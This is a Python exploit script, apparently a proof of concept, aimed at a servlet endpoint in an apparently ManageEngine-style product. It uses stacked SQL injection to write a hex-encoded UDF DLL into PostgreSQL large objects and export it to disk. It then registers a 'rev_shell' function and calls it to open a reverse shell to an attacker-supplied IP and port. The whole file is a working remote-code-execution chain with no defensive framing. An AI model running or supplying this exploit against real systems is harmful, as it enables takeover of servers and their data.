import requests, sys, urllib.request, urllib.parse, urllib.error, string, random, time
requests.packages.urllib3.disable_warnings()
import binascii
import random, string
SCHEMA_NAME = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
TABLE_NAME = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
LOID = lambda : F"(SELECT loid FROM {SCHEMA_NAME}.{TABLE_NAME})"
print(LOID())
# encoded UDF dll
with open('postgres_udf_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read()).decode('utf-8')
loid = 1337

def log(msg):
  print(msg)

def make_request(url, sql):
  log(F"[*] Executing query: {sql}")
  inj = url % sql
  inj.replace(' ','+')
  r = requests.get( inj, verify=False)
  return r

def create_schema(url):
  log(F'[+] Creating Schema {SCHEMA_NAME}...')
  sql = F"CREATE SCHEMA {SCHEMA_NAME};CREATE TABLE {SCHEMA_NAME}.{TABLE_NAME}(loid oid);INSERT INTO {SCHEMA_NAME}.{TABLE_NAME}(loid) VALUES ((SELECT lo_creat(-1)))"
  make_request(url, sql)

def create_lo(url):
  log("[+] Creating LO for UDF injection...")
  sql = F"SELECT lo_import($$C:\\windows\\win.ini$$,{LOID()})"
  make_request(url, sql)

def inject_udf(url):
  log(F"[+] Injecting payload of length {len(udf)} into LO...")
  for i in range(0,((len(udf)-1)//4096+1)):
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sql = F"UPDATE PG_LARGEOBJECT SET data=decode($${udf_chunk}$$, $$hex$$) where loid={LOID()} and pageno={i}"
        else:
            sql = F"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({LOID()}, {i}, decode($${udf_chunk}$$, $$hex$$))"
        make_request(url, sql)

def export_udf(url):
  log("[+] Exporting UDF library to filesystem...")
  sql = F"SELECT lo_export({LOID()}, $$C:\\Users\\Public\\postgres_udf_shell.dll$$)"
  make_request(url, sql)

def create_udf_func(url):
  log("[+] Creating function...")
  sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\postgres_udf_shell.dll$$, $$connect_back$$ language C strict"
  make_request(url, sql)

def trigger_udf(url, ip, port):
  log("[+] Launching reverse shell...")
  sql = F"select rev_shell($${ip}$$, {port})"
  make_request(url, sql)

if __name__ == '__main__':
  try:
      server = sys.argv[1].strip()
      attacker = sys.argv[2].strip()
      port = sys.argv[3].strip()
  except IndexError:
      print(F"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
      sys.exit()

  sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
  create_schema(sqli_url)
  create_lo(sqli_url)
  inject_udf(sqli_url)
  export_udf(sqli_url)
  create_udf_func(sqli_url)
  trigger_udf(sqli_url, attacker, port)


